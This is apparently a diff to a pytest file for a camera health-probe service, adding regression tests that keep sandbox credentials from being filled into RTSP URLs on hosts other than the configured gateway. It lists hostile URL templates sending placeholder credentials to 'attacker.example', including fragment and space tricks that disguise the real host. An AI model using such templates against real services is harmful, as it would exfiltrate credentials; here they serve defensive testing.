@@ -37,9 +37,13 @@ CAMERAS = [
 
 @pytest.fixture()
 def grid(tmp_path, monkeypatch):
-    """A migrated per-test DB with the six-camera grid and a temp tee root."""
+    """A migrated per-test DB with the six-camera grid and a temp tee root.
+    The "sandbox gateway" is pointed at 127.0.0.1:9500 (where reg-dead's
+    template lives), so its placeholders are the gateway's to fill."""
     monkeypatch.setenv("SENTINEL_DB", str(tmp_path / "health.db"))
     monkeypatch.setenv("SENTINEL_HLS_DIR", str(tmp_path / "hls"))
+    monkeypatch.setenv("SENTINEL_STREAM_IP", "127.0.0.1")
+    monkeypatch.setenv("SENTINEL_RTSP_PORT", "9500")
     con = dbmod.connect()
     dbmod.migrate(con)
     now = dbmod.utcnow()
@@ -158,6 +162,84 @@ def test_probe_command_shape(grid, fake_ffprobe, cdn_guard) -> None:
     # The default sandbox pattern for a camera without a template.
     live = next(u for u in by_url if "reg-live" in u)
     assert live.endswith("/stream/reg-live")
+
+
+FAKE_EMAIL = "judge@example.org"
+FAKE_PASSWORD = "not-the-real-password"
+
+#: Templates carrying the credential placeholders on a host that is NOT the
+#: configured sandbox gateway (127.0.0.1:9500 in the grid fixture).
+FOREIGN_TEMPLATES = {
+    "evil-host": "rtsp://<email>:<password>@attacker.example:554/x",
+    "evil-port": "rtsp://<email>:<password>@127.0.0.1:9999/x",
+    "evil-noport": "rtsp://<email>:<password>@127.0.0.1/x",
+    "evil-fragment": "rtsp://<email>:<password>@attacker.example#@127.0.0.1:9500/x",
+    "evil-scheme": "http://<email>:<password>@127.0.0.1:9500/x",
+    "evil-space": "rtsp://<email>:<password>@attacker.example /@127.0.0.1:9500/x",
+}
+
+
+def _credential_forms() -> set[str]:
+    return {FAKE_EMAIL, FAKE_PASSWORD, urllib.parse.quote(FAKE_EMAIL, safe=""),
+            urllib.parse.quote(FAKE_PASSWORD, safe="")}
+
+
+def test_sandbox_credentials_are_never_sent_to_a_non_gateway_host(
+        grid, monkeypatch, fake_ffprobe, cdn_guard) -> None:
+    """Regression (review, 25 Sep; root rule 1): _resolve_rtsp_url filled
+    <email>/<password> for ANY template host, so an evaluator-registered
+    camera with rtsp://<email>:<password>@attacker.example:554/x made the
+    health probe hand the organisers' credentials to attacker.example on an
+    auth challenge. The placeholders are now filled only for a template on
+    the configured gateway (stream_ip:rtsp_port); any other host is probed
+    as-is, placeholders and all."""
+    monkeypatch.setenv("SENTINEL_EMAIL", FAKE_EMAIL)
+    monkeypatch.setenv("SENTINEL_PASSWORD", FAKE_PASSWORD)
+    con = dbmod.connect()
+    now = dbmod.utcnow()
+    for camera_id, template in FOREIGN_TEMPLATES.items():
+        con.execute(
+            "INSERT INTO cameras (camera_id, transport, fps_tier, rtsp_url_template,"
+            " created_at, updated_at) VALUES (?, 'rtsp', 'registered', ?, ?, ?)",
+            (camera_id, template, now, now),
+        )
+    con.commit()
+    con.close()
+
+    health.check_all()
+
+    probed = {cmd[-1] for cmd in fake_ffprobe}
+    for camera_id, template in FOREIGN_TEMPLATES.items():
+        assert template in probed, f"{camera_id} was not probed as-is"
+    secrets = _credential_forms()
+    for url in probed:
+        if "/stream/" in url:
+            continue  # the gateway's own cameras (reg-dead, reg-live)
+        assert not any(s in url for s in secrets), "credentials left the gateway"
+    # The gateway itself still gets them: reg-dead's placeholders are filled.
+    dead = next(u for u in probed if u.endswith("/stream/reg-dead"))
+    assert dead.startswith(
+        f"rtsp://{urllib.parse.quote(FAKE_EMAIL, safe='')}:{FAKE_PASSWORD}@127.0.0.1:9500/")
+
+
+def test_resolve_rtsp_url_fills_placeholders_only_on_the_gateway(grid, monkeypatch) -> None:
+    """The unit rule behind the regression above: gateway host and port
+    (hostname case-insensitive, 554 when the template names none) → filled;
+    anything else → unchanged; a placeholder-free local URL → unchanged."""
+    monkeypatch.setenv("SENTINEL_EMAIL", FAKE_EMAIL)
+    monkeypatch.setenv("SENTINEL_PASSWORD", FAKE_PASSWORD)
+    for template in FOREIGN_TEMPLATES.values():
+        assert health._resolve_rtsp_url("x", template) == template
+    local = "rtsp://127.0.0.1:8554/stream/local01"
+    assert health._resolve_rtsp_url("local01", local) == local
+    filled = health._resolve_rtsp_url(
+        "cam01", "rtsp://<email>:<password>@127.0.0.1:9500/stream/cam01")
+    assert FAKE_PASSWORD in filled and "<password>" not in filled
+    monkeypatch.setenv("SENTINEL_STREAM_IP", "Gateway.Example")
+    monkeypatch.setenv("SENTINEL_RTSP_PORT", "554")
+    filled = health._resolve_rtsp_url(
+        "cam01", "RTSP://<email>:<password>@gateway.example/stream/cam01")
+    assert FAKE_PASSWORD in filled  # default port 554, case-insensitive host
 
 
 def test_probe_timeout_and_pacing_budget() -> None:
